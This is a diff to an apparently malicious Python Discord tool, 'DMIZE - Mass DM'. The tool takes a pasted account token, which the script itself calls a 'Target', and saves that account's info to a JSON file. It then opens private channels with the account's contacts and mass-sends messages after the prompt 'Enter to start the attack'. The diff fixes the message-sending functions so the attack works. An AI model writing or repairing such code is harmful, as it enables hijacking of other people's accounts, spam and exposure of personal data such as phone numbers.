@@ -111,15 +111,19 @@ def Mass_Dm():
         return requests.get(requests_url['guild_channel'].format(guild_id=guild_id),headers=getheaders(token)).json()
     def gather_channels_content(channel_id):
         return requests.get(requests_url['channel_content'].format(channel_id=channel_id), headers=getheaders(token)).json()
-    def send_content():
-        return requests.post(requests_url['message'].format(id=id),json={'content':content},headers=header.update({"Authorization": token})).status_code
-    def send_private_message(id):
+    def send_content(channel_id, content):
+        header.update({"Authorization": token})
+        return requests.post(requests_url['message'].format(id=channel_id), json={'content': content}, headers=header).status_code
+    def send_private_message(id, content):
         try:
-            if send_content() == 200:message_sent += 1 
-            else:pass
-        except: pass      
-    def create_private_channel(id):
-        send_private_message(id=requests.post(requests_url['up_channel'],json={'recipients': [id]},headers=header.update({"Authorization": token})).json()["id"])
+            status_code = send_content(id, content)
+            if status_code == 200:message_sent += 1
+        except :pass
+    def gather_channel_id(_id_):
+        header.update({"Authorization": token})
+        return requests.post(requests_url['up_channel'],json={'recipients': [_id_]},headers=header).json()["id"]
+    def create_private_channel(_id_):
+        send_private_message(content=content ,id=gather_channel_id(_id_))
     def append_guilds():
         append_guilds_id()
         for guild_id in guild_list:
@@ -135,7 +139,9 @@ def Mass_Dm():
         append_guilds()
     def DMIZE():
         gather_ids()
-        for id in id_list:create_private_channel(id)
+        for _id_ in id_list:
+            create_private_channel(_id_)
+            exit()
 
     token = input(f'{Fore.LIGHTBLACK_EX}{used()} {input_prompt()}{Fore.WHITE} Enter Token to MassDm :')
     check_token(token=token)
@@ -143,9 +149,8 @@ def Mass_Dm():
     write_info(token=token)
     print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Target account info upload to {Fore.RED}{gather_discord_username(token=token)}.json{Fore.RED}')
     content = input(f'{Fore.LIGHTBLACK_EX}{used()} {input_prompt()}{Fore.WHITE} Enter the message to sent trough {Fore.RED}{gather_discord_username(token=token)}{Fore.RED}{Fore.WHITE} account :')
-    print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Target account info upload to {Fore.RED}{gather_discord_username(token=token)}.json{Fore.RED}')
     input(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Enter to start the attack ...')
-    DMIZE(token = token , content= content)
+    DMIZE()
    
 def main():
     set_console_title(f'DMIZE - Mass DM | connect as {gather_discord_username(token=gather_token())} : {gather_discord_phone(token=gather_token())}')
